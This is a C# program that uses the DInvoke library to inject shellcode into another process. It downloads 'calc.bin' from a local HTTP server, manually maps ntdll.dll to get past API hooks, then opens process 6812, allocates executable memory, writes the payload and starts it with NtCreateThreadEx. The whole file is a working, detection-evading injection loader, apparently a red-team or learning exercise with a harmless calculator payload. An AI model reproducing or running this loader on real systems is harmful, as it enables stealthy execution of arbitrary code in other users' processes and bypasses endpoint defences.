using System;
using DInvoke.Data;
using DInvoke.ManualMap;
using DInvoke.DynamicInvoke;
using System.Runtime.InteropServices;
using System.Net;
using System.Security.Cryptography;
using static DInvoke.Data.Native;


namespace DInvoke
{
    internal class Program
    {
        public struct CLIENT_ID
        {
            public IntPtr UniqueProcess;
            public IntPtr UniqueThread;
        }

        public enum PROCESS_ACCESS : uint
        {
            None = 0,
            Terminate = 0x0001,
            CreateThread = 0x0002,
            SetSessionId = 0x0004,
            VmOperation = 0x0008,
            VmRead = 0x0010,
            VmWrite = 0x0020,
            DupHandle = 0x0040,
            CreateProcess = 0x0080,
            SetQuota = 0x0100,
            SetInformation = 0x0200,
            QueryInformation = 0x0400,
            SuspendResume = 0x0800,
            QueryLimitedInformation = 0x1000,
            SetLimitedInformation = 0x2000,
            AllAccess = 0x1FFFFF
        }


        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate Data.Native.NTSTATUS NtOpenProcess(
            ref IntPtr processHandle,
            PROCESS_ACCESS desiredAccess,
            ref Data.Native.OBJECT_ATTRIBUTES objectAttributes,
            ref CLIENT_ID clientId);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate Data.Native.NTSTATUS NtAllocateVirtualMemory(
            IntPtr processHandle,
            ref IntPtr baseAddress,
            IntPtr zeroBits,
            ref IntPtr regionSize,
            uint allocationType,
            uint memoryProtection);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate Data.Native.NTSTATUS NtWriteVirtualMemory(
            IntPtr processHandle,
            IntPtr baseAddress,
            IntPtr buffer,
            uint bufferLength,
            ref uint bytesWritten);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate Data.Native.NTSTATUS NtCreateThreadEx(
            out IntPtr threadHandle,
            Data.Win32.WinNT.ACCESS_MASK desiredAccess,
            IntPtr objectAttributes,
            IntPtr processHandle,
            IntPtr startAddress,
            IntPtr parameter,
            bool createSuspended,
            int stackZeroBits,
            int sizeOfStack,
            int maximumStackSize,
            IntPtr attributeList);

        static void Main()
        {
            int proc_id = 6812;

            //Fetch the shellcode
            WebClient webClient = new WebClient();
            webClient.BaseAddress = "http://localhost:8080";
            byte[] sc = webClient.DownloadData("calc.bin");


            var ntdll = Map.MapModuleToMemory("C:\\Windows\\System32\\ntdll.dll");

            var oa = new Data.Native.OBJECT_ATTRIBUTES();
            var cid = new CLIENT_ID
            {
                UniqueProcess = (IntPtr)proc_id
            };

            //Open the process
            var hProcess = IntPtr.Zero;
            var proc_parameters = new object[]
            {
                hProcess, PROCESS_ACCESS.AllAccess, oa, cid
            };
            Console.WriteLine($"Trying to open a handle on process {proc_id}");

            var status = (Data.Native.NTSTATUS)Generic.CallMappedDLLModuleExport(
                ntdll.PEINFO,
                ntdll.ModuleBase,
                "NtOpenProcess",
                typeof(NtOpenProcess),
                proc_parameters,
                false);

            if (status == Data.Native.NTSTATUS.Success)
                hProcess = (IntPtr)proc_parameters[0];
            Console.WriteLine("Process Handle: 0x" + string.Format("{0:X}", hProcess.ToInt64()));

            //Allocate memory
            var baseAddress = IntPtr.Zero;
            var regionSize = new IntPtr(sc.Length);

            object[] mem_parameters =
            {
                hProcess, baseAddress, IntPtr.Zero, regionSize,
                Data.Win32.Kernel32.MEM_COMMIT | Data.Win32.Kernel32.MEM_RESERVE,
                Data.Win32.WinNT.PAGE_EXECUTE_READWRITE
            };

            var mem_status = (Data.Native.NTSTATUS)Generic.CallMappedDLLModuleExport(
                ntdll.PEINFO,
                ntdll.ModuleBase,
                "NtAllocateVirtualMemory",
                typeof(NtAllocateVirtualMemory),
                mem_parameters,
                false
                );

            IntPtr mem_addr = IntPtr.Zero;
            if (mem_status == Data.Native.NTSTATUS.Success)
                mem_addr = (IntPtr)mem_parameters[1];
            Console.WriteLine("Allocated Memory Address: 0x" + string.Format("{0:X}", mem_addr.ToInt64()));

            //Write the shellcode
            Console.WriteLine($"Creating {sc.Length} bytes long buffer for the shellcode");
            var buf = Marshal.AllocHGlobal(sc.Length);
            Marshal.Copy(sc, 0, buf, sc.Length);
            uint Written = 0;

            object[] write_parameters = 
            {
                hProcess, mem_addr, buf, (uint)sc.Length, Written
            };

            var write_status = (Data.Native.NTSTATUS)Generic.CallMappedDLLModuleExport(
                ntdll.PEINFO,
                ntdll.ModuleBase,
                "NtWriteVirtualMemory",
                typeof(NtWriteVirtualMemory),
                write_parameters,
                false
            );


            if (write_status == Data.Native.NTSTATUS.Success)
                Written = (uint)write_parameters[4];
            else
                Console.WriteLine($"Failed writing 0x{write_status:X}");
            Console.WriteLine($"Bytes Written to the allocated memory: {Written}");
            Marshal.FreeHGlobal(buf);


            //Execute the shellcode
            var thand = IntPtr.Zero;
            object[] thread_parameters =
            {
                 thand, Data.Win32.WinNT.ACCESS_MASK.STANDARD_RIGHTS_ALL , IntPtr.Zero, hProcess, mem_addr, IntPtr.Zero, false, 0,
            0, 0, IntPtr.Zero
            };
            Console.WriteLine("Creating a thread in the process to execute the shellcode");
            var thread_status = (Data.Native.NTSTATUS)Generic.CallMappedDLLModuleExport(
               ntdll.PEINFO,
               ntdll.ModuleBase,
               "NtCreateThreadEx",
               typeof(NtCreateThreadEx),
               thread_parameters,
               false
            );

            //Free the ntdll.dll
            Map.FreeModule(ntdll);

        }
    }
}
